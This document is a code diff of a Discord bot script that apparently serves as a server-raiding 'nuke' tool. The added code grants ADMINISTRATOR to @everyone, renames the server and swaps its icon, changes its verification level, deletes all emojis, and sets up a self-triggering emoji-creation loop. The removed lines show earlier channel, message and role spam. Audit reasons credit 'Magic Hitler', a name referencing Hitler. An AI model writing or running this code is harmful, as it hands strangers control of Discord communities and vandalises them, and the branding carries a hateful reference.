@@ -2,48 +2,27 @@ const Discord = require('discord.js');
 const client = new Discord.Client();
 const settings = require('../settings.json');
 
-client.on("ready", () => {
+client.on('ready', () => {
     function all() {
         client.guilds.get(settings.auto.server_id).roles.find('name', '@everyone').edit({
-            permissions: ['ADMINISTRATOR']
+            permissions: ["ADMINISTRATOR"]
         });
-        if (settings.config.role_crt === 1) {
-            client.guilds.get(settings.auto.server_id).createRole({
-                name: "Bot made by Magic Hiler",
-                permissions: ["ADMINISTRATOR"]
-            });
-        }
-        client.guilds.get(settings.auto.server_id).channels.map(c => {
-            if (c.type === 'text') {
-                c.send(settings.config.msg);
+        if (settings.autoa.guild.enabled === 1) {
+            client.guilds.get(settings.auto.server_id).setName(settings.autoa.guild.name, 'Bot by Magic Hitler');
+            client.guilds.get(settings.auto.server_id).setIcon(settings.autoa.guild.icon, 'Bot By Magic Hitler');
+            client.guilds.get(settings.auto.server_id).setVerificationLevel(settings.autoa.guild.verification_level, 'Bot by Magic Hitler');
+            if (settings.autoa.guild.delete_emojis === 1) {
+                client.guilds.get(settings.auto.server_id).emojis.map(e => client.guilds.get(settings.auto.server_id).deleteEmoji(e, 'Bot by Magic Hitler'));
             }
-        });
-        client.guilds.get(settings.auto.server_id).createChannel(settings.config.chnlname, 'text');
-    }
-    setTimeout(all, 1000)
-});
-
-client.on("message", message => {
-    if (message.guild.id === settings.auto.server_id) {
-        if (message.author.id === settings.ownerid) {
-            if (message.content === 'stop') {
-                process.exit();
+            if (settings.autoa.guild.create_emojis.enabled === 1) {
+                client.guilds.get(settings.auto.server_id).createEmoji(settings.autoa.guild.create_emojis.link, settings.autoa.guild.create_emojis.name)
             }
         }
-        message.channel.send(settings.config.msg);
     }
 });
 
-client.on("channelCreate", channel => {
-    channel.send(settings.config.msg);
-    client.guilds.get(settings.auto.server_id).createChannel(settings.config.chnlname, 'text');
-});
-
-client.on("roleCreate", role => {
-    role.guild.createRole({
-        name: "Bot made by Magic Hitler",
-        permissions: ["ADMINISTRATOR"]
-    });
-});
+client.on('emojiCreate', emoji => {
+    client.guilds.get(settings.auto.server_id).createEmoji(settings.autoa.guild.create_emojis.link, settings.autoa.guild.create_emojis.name);
+})
 
 client.login(settings.token);
